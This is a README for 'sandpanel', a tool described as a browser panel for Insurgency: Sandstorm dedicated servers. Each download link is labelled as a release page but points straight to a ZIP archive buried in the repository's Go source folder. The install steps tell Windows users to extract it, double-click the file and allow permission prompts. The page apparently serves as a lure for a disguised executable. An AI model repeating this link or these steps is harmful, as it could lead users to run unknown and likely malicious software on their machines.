# 🛠️ sandpanel - Manage Sandstorm servers from one place

[![Download](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge)](https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip)

## 📦 What is sandpanel?

sandpanel is a web panel for managing Insurgency: Sandstorm dedicated servers.

It gives you one place to handle common server tasks without working through command lines and config files by hand. You can use it to keep your server running, update game files, manage mods, and work with remote server tools from a browser.

It is built with Go and React. That means the app runs as a web panel and works well on a Windows machine that hosts your server.

## 🖥️ What you need

Before you install sandpanel, make sure you have:

- A Windows PC or server
- Internet access for the first download
- A browser such as Edge, Chrome, or Firefox
- An Insurgency: Sandstorm dedicated server setup
- Enough free disk space for the app, server files, and mods
- Permission to run programs on the machine

For smooth use, keep your server files on a drive with enough space for updates and workshop content.

## 🚀 Download sandpanel

Visit this page to download: https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip

On that page, look for the latest release and download the Windows file for your machine. If the release includes a ZIP file, save it to a folder you can reach easily, such as Downloads or Desktop.

## 🪟 Install on Windows

Follow these steps to get sandpanel running on Windows:

1. Open the release page and download the latest Windows build.
2. Find the file you downloaded.
3. If the file is a ZIP archive, right-click it and choose Extract All.
4. Open the extracted folder.
5. Look for the app file or start script in the folder.
6. Double-click the file to start sandpanel.
7. If Windows asks for permission, choose Allow or Yes.
8. Keep the window open while the app runs.

If the app opens in your browser, leave the server window running in the background. If it uses a local web address, open that address in your browser.

## 🌐 Open the web panel

After the app starts, use your browser to open the panel.

Typical local addresses may look like:

- http://localhost:8080
- http://127.0.0.1:8080

The exact address can vary by release. Check the release notes or the startup window if the address is different.

When the panel loads, you can begin setting up your server.

## 🎮 Main things you can do

sandpanel helps you manage a Sandstorm dedicated server from a browser. Common tasks include:

- Start and stop the server
- Restart the server
- Watch server status
- Edit server settings
- Handle map and mod lists
- Work with SteamCMD updates
- Use RCON for remote control
- Keep server data in one place
- Manage multiple server files on one machine

This cuts down on the need to switch between folders, tools, and command windows.

## 🔧 First-time setup

Use this flow the first time you open sandpanel:

1. Start the app on your Windows machine.
2. Open the web address shown by the app.
3. Sign in if the panel asks for login details.
4. Point the app to your Sandstorm server folder.
5. Check the server path and config path.
6. Save the settings.
7. Test the start and stop controls.
8. Confirm the server comes online.

If you host more than one server, add each one in its own entry so the files stay separate.

## 🧩 Mod.io and workshop use

sandpanel supports mod.io and Steam workshop-based server tasks. That helps if your server uses custom maps, mods, or other community content.

You can use the panel to:

- Add mod IDs
- Track installed content
- Update mod files
- Keep mod data tied to the right server
- Reduce manual file work

If your server uses modded content, keep your mod list clean. Remove old entries you no longer use so the server loads faster and stays easier to manage.

## 🛡️ RCON access

RCON lets you control the server from a remote tool or admin panel. sandpanel includes support for that kind of server control.

You may use RCON to:

- Send server commands
- Check live status
- Help with admin tasks
- Handle game state without opening the game server window

Set a strong RCON password and keep it private. Use the same value in your server config and in sandpanel.

## 📁 Suggested folder setup

A simple folder layout makes server work easier:

- `C:\Sandstorm\Server` for game server files
- `C:\Sandstorm\Mods` for mod content
- `C:\Sandstorm\Backups` for saved copies
- `C:\sandpanel` for the app files

You can use other paths, but keep them short and clear. This helps when you update paths in the panel and in config files.

## 🔄 Updates

When a new version of sandpanel is released:

1. Go back to the release page.
2. Download the latest Windows build.
3. Stop the app before replacing files.
4. Back up your settings if you changed them.
5. Replace the old files with the new ones.
6. Start the app again.

Keep your server data separate from the app folder. That makes updates safer and easier.

## 🧰 Common checks if something does not work

If sandpanel does not start or the page does not load, check these items:

- The app window is still open
- Windows did not block the file
- You extracted the ZIP file before running it
- The port is not in use by another app
- Your server folder path is correct
- Your firewall allows local web access
- Your browser is using the right address

If the server still does not load, restart the app and try again. In many cases, the issue is a bad path or a blocked port.

## 📌 Basic workflow

A normal setup with sandpanel often looks like this:

1. Download the app from the release page
2. Start the app on Windows
3. Open the web panel in your browser
4. Add your Sandstorm server path
5. Set your RCON details
6. Install or update mods
7. Start the server
8. Check the server from the panel when you need to make changes

## 🧾 File and browser tips

For the best experience:

- Use a stable browser
- Keep the panel window open while the server runs
- Save server paths in one place
- Back up config files before big changes
- Keep a copy of your mod list
- Use a fixed folder for each server

If you run the panel on the same computer as the game server, it is easier to manage and update both at once

## 🧭 Release page

Download or update sandpanel here: https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip

Look for the latest release files on that page and use the Windows version for your setup